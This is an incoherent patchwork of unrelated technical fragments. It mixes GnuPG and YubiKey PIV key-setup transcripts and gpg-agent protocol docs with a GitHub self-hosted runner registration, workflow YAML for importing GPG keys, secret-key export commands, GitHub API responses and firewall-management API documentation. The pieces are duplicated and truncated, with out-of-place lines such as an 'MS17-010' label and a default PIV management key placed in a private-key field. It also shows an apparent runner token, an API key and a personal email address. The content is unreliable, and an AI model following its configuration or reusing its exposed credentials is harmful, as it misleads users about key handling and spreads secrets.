name: List keys @@ -992,7 +992,7 @@ Name-Email: otto@example.net (3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key: (1) sign, encrypt (2) sign -(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used: +(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example "648c63bb32eaa48ed50bff8a5000d9f3065359372b82739a992a00ce758bfcd2 actions-runner-osx-x64-2.312.0.tar.gz" | shasum -a 256 -c
./config.sh --url https://github.com/6309304695/sigma-9 --token A4D7THKPGUP3WF5SOJVYMETFXIK2O

runs-on: self-hosted

+SET KEYS+ & +READ KEYS+ (2). Github Private signing Keys. --header--(1.) 'SHA256:Yg4kSqr/z+BsEtXCeN6bSEsVL4LJnCZjYx6dB4Eoxu8=' --header--(2.) 'SHA256:7iA71iHP1e+aLtJUVQ4cTNtVu1hVdn2Vr94R/jWrsa8='

<gpg/card> writecert PIV.9C < sign.crt +# MS17-010 +# 000006 +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - [verified] - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

keyref .....: PIV.9A (auth) algorithm ..: nistp384 +Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

keyref .....: PIV.9E (auth) algorithm ..: nistp256 +Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Signing key for yk-9074625,O=example,C=DE user id ..: <6309304695z@gmail.co m> +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: 6309304695z@gmail.com PIV authentication’ key with ssh: +$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) +ssh-add with the uppercase ‘-L +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:

(1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) (14) Existing key from card +Your selection? (1,2,3,4& 14) all please. +Serial number of the card: FF020001008A77C1 +Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 3 +Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years +Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: keith bieszczat +Email address: 6309304695z@gmail.com +Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator +You selected this USER-ID: "6309304695z@gmail.com" +SET KEYS + READ KEYS + LEARN+

(2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) -(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys: +(14) Existing key from card +Your selection? (2,3,4 & 14) all please. ++Serial number of the card: FF020001008A77C1 +Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)

READ KEYS+ ---@@ PIV authentication’ key with ssh: (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) -(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys: +(14) Existing key from card +Your selection? (2,3,4 & 14) all please. ++Serial number of the card: FF020001008A77C1 +Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)

+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +uid 6309304695z@gmail.com +

run gpg in --expert mode $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available. +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate +[ultimate] (1). otto@example.net +gpg> addkey +Secret parts of primary key are stored on-card. +Please select what kind of key you want:

(3) DSA (sign only) (4) RSA (sign only) (5) Elgamal (encrypt only) (6) RSA (encrypt only) (14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 4 +Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years +Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y +Really create? (y/N) y + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate +ssb rsa2048/7067860A98FCE6E1

created: 2019-04-04 expires: never usage: E card-no: FF020001008A77C1 +[ultimate] (1). otto@example.net + +gpg> save + +/* 32A19-D90712 +LEVEL-5 CLEARANCE ONLY

‘--force’ +authentication key +-header-'010203040506070801020304050607080102030405060708' +SETDATA hexstring +to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command PKSIGN keyid +where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like: PKSIGN --hash=algoname keyid +READKEY hexified_certid +READCERT hexified_certid|keyid +SERIALNO +Return the serial number of the card using a status response like: 'S SERIALNO D27600000000000000000000' +WRITEKEY [--force] keyid +SETDATA hexstring +to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command PKDECRYPT keyid +CHECKPIN idstr +RESTART +APDU [--atr] [--more] [--exlen[=n]] [hexstring] '+S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1' +./configure --sysconfdir=/etc --localstatedir=/va +CN=Wurzel ZS 3,O=Intevation GmbH,C=DE

A6935DD34EF3087973C706FC311AA2CCF733765B S CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S

Key added on: 2011-07-20 20:38:46

Fingerprint: 5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81

34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm +private-keys-v1.d/ +gpg-connect-agent 'help COMMAND' /bye +SETKEY +Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.

PKDECRYPT +The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.

C: PKDECRYPT S: INQUIRE CIPHERTEXT C: D (enc-val elg (a 349324324) C: D (b 3F444677CA))) C: END S: # session key follows S: S PADDING 0 S: S PADDING 0 S: S PADDING 0 S: S PADDING 0 S: D (value 000006004grateful) S: OK decryption successful

Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure: (enc-val ( (<param_name1> ) ... (<param_namen> ))) +Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency. + +If the decryption was successful the decrypted data is returned by means of "D" lines. + +Here is an example session: +

C: PKDECRYPT S: INQUIRE CIPHERTEXT C: D (enc-val elg (a 349324324) C: D (b 3F444677CA))) C: END S: # session key follows S: S PADDING 0 S: D (value 1234567890ABCDEF0) S: OK decryption successful +The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has +SIGKEY +This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay. SETHASH --hash=| +sig-val ( (<param_name1> ) ... (<param_namen> ))) +The operation is affected by the option +Option 1+

OPTION use-cache-for-signing=0|1 +The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching. +Here is an example session: +

C: SIGKEY S: OK key available C: SIGKEY S: OK key available C: PKSIGN S: # I did ask the user whether he really wants to sign S: # I did ask the user for the passphrase S: INQUIRE HASHVAL C: D ABCDEF012345678901234 C: END S: # signature follows S: D (sig-val rsa (s 45435453654612121212)) S: OK GENKEY [--no-protection] [--preset] [<cache_nonce>] +Invokes the key generation process and the server will then inquire on the generation parameters, like: S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END +The format of the key parameters which depends on the algorithm is of the form: (genkey (algo (parameter_name_1 ....) .... (parameter_name_n ....))) +If everything succeeds, the server returns the public key in a SPKI like S-Expression like this: +

(public-key (rsa (n ) (e ))) +Here is an example session: C: GENKEY S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END S: D (public-key S: D (rsa (n 326487324683264) (e 10001))) S OK key created ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> +LISTTRUSTED +GpgAgent returns a list of trusted keys line by line: S: D 000000001234454556565656677878AF2F1ECCFF P S: D 340387563485634856435645634856438576457A P S: D FEDC6532453745367FD83474357495743757435D S S: OK +The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. +Ok +Finally a client should be able to mark a key as trusted: MARKTRUSTED fingerprint "P"|"S" +The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this: S: INQUIRE TRUSTDESC C: D Do you trust the key with the fingerprint @FPR@ C: D bla fasel blurb. C: END S: OK +GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]]
[--qualitybar] cache_id
[error_message prompt description] +PRESET_PASSPHRASE [--inquire] <Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092

C17D11ADF199F12A30A0910F1F80449BE0B08CB8

Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB> [] + +HAVEKEY keygrips

GET_CONFIRMATION description LEARN [--send] +UPDATESTARTUPTTY +SETDATA hexstring PKSIGN keyid PKSIGN --hash=algoname keyid +READCERT hexified_certid|keyid +READKEY hexified_certid +SETDATA hexstring +d +

PKSIGN keyid LEARN PKSIGN --hash=algoname keyid +WRITEKEY [--force] keyid +WRITEKEY [--force] keyid +PASSWD [--reset] [--nullpin] chvno +CHECKPIN idstr +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +this: + <{Shadowed Card}> & <{Learn}> 'S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1' +--auto-key-import + +command --locate-external-key +command --locate-external-key +github/workflows/release.yml: +ldap://keys.(c7-use-3.algolianet. com) +‘--auto-key-locate

--auto-key-locate +--auto-key-retrieve honor-keyserver-url +-sig-keyserver-url +--recv-key +honor-keyserver-url +--use-agent +--gpg-agent-info + + +--no-random-seed-file +Host: c7-use-3.algolianet. com +Accept:

+gpg-connect-agent /bye +--scdaemon-program filename ++--check-passphrase-pattern file +--check-sym-passphrase-pattern file
+Content-Length: 27 +Connection: keep-alive +Content-Type: application/x-www-form-urlencoded +Sec-Fetch-Dest: empty + +scdaemon.conf +1 +HKCU\Software\GNU\GnuPG:DefaultLogFile, +--debug-level level +HKCU\Software\GNU\GnuPG:DefaultLogFile, +scd-event +HKCU\Software\GNU\GnuPG:HomeDir +HKCU\Software\GNU\GnuPG:DefaultLogFile, +reader_n.status +HKCU\Software\GNU\GnuPG:HomeDir + +trustlist.txt file +gpg-agent.conf +HKCU\Software\GNU\GnuPG:HomeDir +name: release +debug-pinentry +--debug 1024 + +global trustlist (/usr/local/etc/gnupg/trustlist.tx + +Active cards +Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. +gpg-connect-agent updatestartuptty /bye +Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command: + +gpg-connect-agent /bye +--scdaemon-program filename +Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf +--check-passphrase-pattern file +--check-sym-passphrase-pattern file +Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) +bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe +Keys listed in the sshcontrol file +--disable-extended-key-format +These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched. + +--enable-ssh-support +--enable-win32-openssh-support +--enable-putty-support + +gpg-connect-agent 'GETINFO s2k_count' /bye +gpg-connect-agent 'GETINFO s2k_time' /bye +To view the auto-calibrated count use: + +gpg-connect-agent 'GETINFO s2k_count_cal' /bye +--ssh-fingerprint-digest +Keys listed in the sshcontrol file + +Active card +gpg-connect-agent /bye +bashrc or whatever initialization file is used for all shell invocations: + +GPG_TTY=$(tty) +export GPG_TTY +--daemon [SIGKEYS & +gpg-card AUTHENTICATE & WRITEKEY & WRITECERT] +server + +agent-program file ¶ +Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs. + +--gpg-program file +Specify a non-default gpg binary to be used by certain commands. + +--gpgsm-program file +Specify a non-default gpgsm binary to be used by certain commands. + +--chuid uid +Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows. + +gpg-card +AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ +AUTH +FETCH +GENERATE [--force] [--algo=algo{+algo2}] keyref +KDF-SETUP ¶ +Prepare the OpenPGP card KDF feature for this card. + +LANG [--clear] +Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info. + +LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] +NAME [--clear] +PRIVATEDO [--clear] n [< file] file +READCERT [--openpgp] certref > file ¶ +Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". +URL [--clear] +gpg's. --fetch +WRITECERT certref < file ¶ +WRITECERT --openpgp certref [< file|fpr] +WRITECERT --clear certref

--openpgp +file +fpr. +WRITEKEY [--force] keyref keygrip ¶ +Write a private key object identified by keygrip to the card under the id keyref. +CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ +Serial number +A hex-string with the serial number of the card. +Type +This gives the type of the card’s application. For example "OpenPGP" or "PIV". + +Keygrip +A hex-string identifying a key. + +Keyref +The application slot where the key is stored on the card. For example "OpenPGP.1" + +Status +The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card. + +YUBIKEY cmd args +Various commands pertaining to Yubikey tokens with cmd being: + +LIST +List supported and enabled Yubikey applications. + +ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] +ENABLE +Enable or disable the specified or all applications on the given interface. + +The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit. + +GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708. + +PIV Application PIN +This is the string 123456. + +PIN Unblocking Key +This is the string 12345678. +list (the string gpg/card> +card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: D2760001240102010006090746250000 +Application type .: OpenPGP +Version ..........: 2.1 +[...] +on:

push: tags:

"v*" +permissions:
contents: write +jobs:

release: runs-on: ubuntu-latest steps:

uses: actions/checkout@v3
uses: cli/gh-extension-precompile@v1 with: go_version: "1.16" +Then +- uses: cli/gh-extension-precompile@v1
env: CGO_ENABLED: 1 +- uses: cli/gh-extension-precompile@v1 with: build_script_override: "script/build.sh" +name: release +on:

push: tags:

"v*" +permissions:
contents: write +jobs:

release: runs-on: ubuntu-latest steps:

uses: actions/checkout@v3
id: import_gpg uses: crazy-max/ghaction-import-gpg@v5 with: gpg_private_key: {{ 010203040506070801020304050607080102030405060708 }}
uses: cli/gh-extension-precompile@v1 with: gpg_fingerprint: ${{ 5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81 }} +# macOS +gpg --armor --export-secret-key joe@foo.bar | pbcopy + +# Ubuntu (assuming GNU base64) +gpg --armor --export-secret-key joe@foo.bar -w0 | xclip + +# Arch +gpg --armor --export-secret-key SHA256:Yg4kSqr/z+BsEtXCeN6bSEsVL4LJnCZjYx6dB4Eoxu8= | xclip -selection clipboard -i + +# FreeBSD (assuming BSD base64) +gpg --armor --export-secret-key SHA256:Yg4kSqr/z+BsEtXCeN6bSEsVL4LJnCZjYx6dB4Eoxu8= | xclip + +name: import-gpg + +on:
push: branches: master +jobs:

import-gpg: runs-on: ubuntu-latest steps:

name: Checkout uses: actions/checkout@v4

name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ 010203040506070801020304050607080102030405060708 }}

GitHub CLI api

https://cli.github.com/manual/gh_api

gh api
-H "Accept: application/vnd.github+json"
-H "X-GitHub-Api-Version: 2022-11-28"
/

{ "current_user_url": "https://api.github.com/user", "current_user_authorizations_html_url": "https://github.com/settings/connections/applications{/client_id}", "authorizations_url": "https://api.github.com/authorizations", "code_search_url": "https://api.github.com/search/code?q={query}{&page,per_page,sort,order}", "commit_search_url": "https://api.github.com/search/commits?q={query}{&page,per_page,sort,order}", "emails_url": "https://api.github.com/user/emails", "emojis_url": "https://api.github.com/emojis", "events_url": "https://api.github.com/events", "feeds_url": "https://api.github.com/feeds", "followers_url": "https://api.github.com/user/followers", "following_url": "https://api.github.com/user/following{/target}", "gists_url": "https://api.github.com/gists{/gist_id}", "hub_url": "https://api.github.com/hub", "issue_search_url": "https://api.github.com/search/issues?q={query}{&page,per_page,sort,order}", "issues_url": "https://api.github.com/issues", "keys_url": "https://api.github.com/user/keys", "label_search_url": "https://api.github.com/search/labels?q={query}&repository_id={repository_id}{&page,per_page}", "notifications_url": "https://api.github.com/notifications", "organization_url": "https://api.github.com/orgs/{org}", "organization_repositories_url": "https://api.github.com/orgs/{org}/repos{?type,page,per_page,sort}", "organization_teams_url": "https://api.github.com/orgs/{org}/teams", "public_gists_url": "https://api.github.com/gists/public", "rate_limit_url": "https://api.github.com/rate_limit", "repository_url": "https://api.github.com/repos/{owner}/{repo}", "repository_search_url": "https://api.github.com/search/repositories?q={query}{&page,per_page,sort,order}", "current_user_repositories_url": "https://api.github.com/user/repos{?type,page,per_page,sort}", "starred_url": "https://api.github.com/user/starred{/owner}{/repo}", "starred_gists_url": "https://api.github.com/gists/starred", "topic_search_url": "https://api.github.com/search/topics?q={query}{&page,per_page}", "user_url": "https://api.github.com/users/{user}", "user_organizations_url": "https://api.github.com/user/orgs", "user_repositories_url": "https://api.github.com/users/{user}/repos{?type,page,per_page,sort}", "user_search_url": "https://api.github.com/search/users?q={query}{&page,per_page,sort,order}" }

GitHub CLI api

https://cli.github.com/manual/gh_api

gh api
-H "Accept: application/vnd.github+json"
-H "X-GitHub-Api-Version: 2022-11-28"
/meta

{ "verifiable_password_authentication": true, "ssh_key_fingerprints": { "SHA256_RSA": 1234567890, "SHA256_DSA": 1234567890, "SHA256_ECDSA": 1234567890, "SHA256_ED25519": 1234567890 }, "ssh_keys": [ "ssh-ed25519 ABCDEFGHIJKLMNOPQRSTUVWXYZ", "ecdsa-sha2-nistp256 ABCDEFGHIJKLMNOPQRSTUVWXYZ", "ssh-rsa ABCDEFGHIJKLMNOPQRSTUVWXYZ" ], "hooks": [ "192.0.2.1" ], "github_enterprise_importer": [ "192.0.2.1" ], "web": [ "192.0.2.1" ], "api": [ "192.0.2.1" ], "git": [ "192.0.2.1" ], "packages": [ "192.0.2.1" ], "pages": [ "192.0.2.1" ], "importer": [ "192.0.2.1" ], "actions": [ "192.0.2.1" ], "dependabot": [ "192.0.2.1" ], "domains": { "website": [ ".example.com" ], "codespaces": [ ".example.com" ], "copilot": [ ".example.com" ], "packages": [ ".example.com" ] } } Get

GitHub CLI api

https://cli.github.com/manual/gh_api

gh api
-H "Accept: application/vnd.github+json"
-H "X-GitHub-Api-Version: 2022-11-28"
/octocat

MMM. .MMM\n MMMMMMMMMMMMMMMMMMM\n MMMMMMMMMMMMMMMMMMM __________________________________\n MMMMMMMMMMMMMMMMMMMMM | |\n MMMMMMMMMMMMMMMMMMMMMMM | Avoid administrative distraction. |\n MMMMMMMMMMMMMMMMMMMMMMMM | ______________________________|\n MMMM::- -:::::::- -::MMMM |/\n MM~:~ 00~:::::~ 00~:~MM\n .. MMMMM::.00:::+:::.00::MMMMM ..\n .MM::::: .. :::::MM.\n MMMM;:::::;MMMM\n -MM MMMMMMM\n ^ M+ MMMMMMMMM\n MMMMMMM MM MM MM\n MM MM MM MM\n MM MM MM MM\n .MMMMMM~MM.\n ~~~~MM:MM~~~MM:MM~~~~\n ~~~~~~====~~~====~~~~~~\n ~~~~~~========~~~~~~\n :======~==~~\n"

GitHub CLI api

https://cli.github.com/manual/gh_api

gh api
-H "Accept: application/vnd.github+json"
-H "X-GitHub-Api-Version: 2022-11-28"
/versions

GitHub CLI api

https://cli.github.com/manual/gh_api

gh api
-H "Accept: application/vnd.github+json"
-H "X-GitHub-Api-Version: 2022-11-28"
/zen

Request: GET /api/headquarters/config

Response: HTTP 200 {"config" : "<...>"}

Request: POST /api/branch/rules {"name" : "Test01", "from" : "trust", "to" : "untrust", "source" : "10.1.1.1", "destination" : "8.8.8.8", "action" : "allow", "application" : "junos-dns-udp"} Response: HTTP 201 {} Request: DELETE /api/branch1/rules {"name" : "Permit Any"} Response: HTTP 200 {}

Request: PUT /api/branch2/objects/address-group {"name" : "Admin_Servers", "members" : [ "Server02" ] } Response: HTTP 200 {}

Request: PATCH /api/paloalto/headquarters/route {"name" : "internal", "destination" : "10.0.0.0/8", "next-hop" : "172.16.1.2" } Response: HTTP 200 {}

cd /opt git clone https://github.com/videlanicolas/assimilator && cd assimilator ./generate_certificate.sh docker build -t assimilator /opt/assimilator/ docker run -d -p 443:443/tcp assimilator

cd /opt git clone https://github.com/videlanicolas/assimilator && cd assimilator ./generate_certificate.sh sudo ./install.sh

POST /firewalls/argentina HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0 { "brand" : , "description" : , #JSON object keys for the Firewall brand ... }

GET /firewalls/argentina HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0

GET /firewalls/argentina HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0 200 OK The key is the Firewall name through the api, in this example the key is ‘argentina’. Inside this JSON object we have the following keys:

"brand" : The Firewall's brand, this will indicate which translator script should be invoked when connecting to this firewall. "primary" : The Firewall's primary IP address, in PaloAlto this should be the Management IP address. "secondary" : The Firewall's secondary IP address, in PaloAlto this should be the Management IP address. "key" : XML API key to be used by Assimilator when connecting to this PaloAlto Firewall. "description" : Some description about this device.

GET /firewalls/datacenter HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0 200 OK The key is the Firewall name through the api, in this example the key is ‘datacenter’. Juniper allows users to login either with a password or a certificate, the latter one is encouraged. Inside this JSON object we have the following keys:

"brand" : The Firewall's brand, this will indicate which translator script should be invoked when connecting to this firewall. "primary" : The Firewall's primary IP address, in Juniper this should be the trust IP address. "secondary" : The Firewall's secondary IP address, in Juniper this should the trust IP address. "user" : The username that Assimilator should use while logging in, it usually is 'assimilator'. "privatekey" : Location of the certificate file to be used for SSH authentication, if not specified then user/password will be used. "privatekeypass" : The password to decrypt the private key from the certificate, if not specified then user/password will be used. "pass" : The password to be used for SSH login, this is used if privatekey and privatekeypass is not specified. "port" : The SSH port on the Firewall, usually 22. "description" : Some description about this device.

GET /api/argentina/config key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 OK Rules

/api//rules

Get all rules in the selected Firewall. This can be filtered with URL arguments.

Example (PaloAlto)

GET /api/argentina/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 OK Example with arguments (PaloAlto)

GET /api/argentina/rules?from=dmz&to=untrust key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 OK To add a rule one simply change the method to POST and sends one of these JSON objects in the body of the request.

POST /api/brasil/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "log-end": true, "qos": { "marking": null, "type": null }, "negate-source": false, "disabled": true, "rule-type": "universal", "tag": [], "log-start": false, "hip-profiles": [], "negate-destination": false, "description": null, "category": [ "any" ], "from": [ "dmz" ], "service": [ "any" ], "source": [ "any" ], "destination": [ "10.10.50.2", ], "application": [ "web-browsing", "ssl" ], "profile-setting": null, "log-setting": null, "to": [ "untrust" ], "schedule": null, "source-user": [ "any" ], "icmp-unreachable": false, "name": "Internet access", "disable-server-response-inspection": false, "action": "allow" }

POST /api/brasil/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "name" : "Some Rule Name", "source" : { "192.168.1.50", "192.168.1.40" } } To append new objects to a rule use PATCH, here we add objects to destination.

POST /api/brasil/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "name" : "Some Rule Name", "destination" : { "100.200.100.10" } } Match

/api//rules/match

A very useful resource is match. With it one can test a source, destination and port to check if the Firewall allows that connection. Many Firewalls already have this funcionality, other don’t (AWS). What they lack is the ease of use. Assimilator only requires source, destination and port (optionally a protocol), other required input by the Firewalls (such as dmz zones) are resolved by Assimilator either through route tables or configuration. If the access is granted then it returns the rule that allows it.

GET /api/uruguay/rules/match?source=192.168.4.5&destination=100.150.100.150&port=443 key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 ok Objects

/api//objects/<address|address-group|service|service-group>

Firewall objects identify hosts and ports in the rules, basically there are four type of objects:

